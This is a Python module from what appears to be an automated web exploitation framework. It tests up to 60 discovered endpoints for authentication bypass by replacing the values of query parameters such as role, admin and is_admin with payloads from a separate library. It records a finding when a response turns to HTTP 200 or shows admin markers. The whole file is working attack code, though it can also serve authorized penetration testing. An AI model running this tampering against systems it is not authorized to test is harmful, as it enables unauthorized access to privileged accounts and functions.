from __future__ import annotations
from urllib.parse import parse_qsl,urlsplit,urlencode,urlunsplit
from core.module import ExploitModule
from core.models import ExploitResult
from core.payloads import get_payloads
class AuthBypassModule(ExploitModule):
    name="Auth Bypass"; category="auth"
    PARAMS={"role","admin","is_admin","authenticated","auth","user","username","access"}
    async def run(self,ctx):
        evidence=[]; probes=get_payloads(self.name)
        for endpoint in ctx.artifacts.get("recon.endpoints",[])[:60]:
            p=urlsplit(endpoint);params=parse_qsl(p.query,keep_blank_values=True)
            try:
                baseline = await ctx.http.request("GET", endpoint)
            except Exception:
                baseline = None
            for idx,(name,_) in enumerate(params):
                if name.lower() not in self.PARAMS: continue
                for i,payload in enumerate(probes,1):
                    ctx.logger(f"[payload {i}/{len(probes)}] Auth Bypass: {payload}")
                    m=params.copy();m[idx]=(name,payload);probe=urlunsplit((p.scheme,p.netloc,p.path,urlencode(m),p.fragment))
                    try:
                        r=await ctx.http.request("GET",probe)
                        ctx.inspect_source(str(r.url),r.text,payload,i,r.headers.get("content-type",""))
                        evidence.append(f"{probe} -> {r.status_code}, {len(r.text)} bytes")
                        low=r.text.lower()
                        if (r.status_code == 200 and baseline is not None and r.status_code != baseline.status_code) or any(x in low for x in ("admin panel", "administrator", "is_admin")):
                            ctx.add_finding(probe, payload, self.name, f"HTTP {r.status_code}; privileged/authentication markers observed", confidence="medium")
                            evidence.append(f"[finding] {probe} -> privileged/authentication markers; continuing remaining auth-bypass probes")
                    except Exception as exc:evidence.append(str(exc))
        return ExploitResult(self.name,"signal" if ctx.artifacts.get("findings.detected") else "no-signal","Auth-bypass probes completed (all payloads tested)",evidence="\n".join(evidence[:20]))
